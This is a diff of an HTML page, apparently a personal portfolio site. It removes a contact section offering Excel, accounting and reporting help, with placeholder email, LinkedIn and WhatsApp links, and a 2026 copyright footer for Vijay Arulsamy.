-            <p class="contact-text">
-
-                Have an Excel, accounting, reporting or business-data
-                problem? Tell me what you currently have and what result
-                you want to achieve.
-
-            </p>
-
-
-            <div class="contact-links">
-
-                <a
-                    class="contact-link"
-                    href="mailto:your-email@example.com"
-                >
-                    Email
-                </a>
-
-
-                <a
-                    class="contact-link"
-                    href="#"
-                >
-                    LinkedIn
-                </a>
-
-
-                <a
-                    class="contact-link"
-                    href="#"
-                >
-                    WhatsApp
-                </a>
-
-            </div>
-
-        </div>
-
-    </section>
-
-
-    <!-- =====================================
-         FOOTER
-    ===================================== -->
-
-    <footer>
-
-        © 2026 Vijay Arulsamy. All rights reserved.
-
-    </footer>
-
-
+    </div>
 </body>
-
 </html>
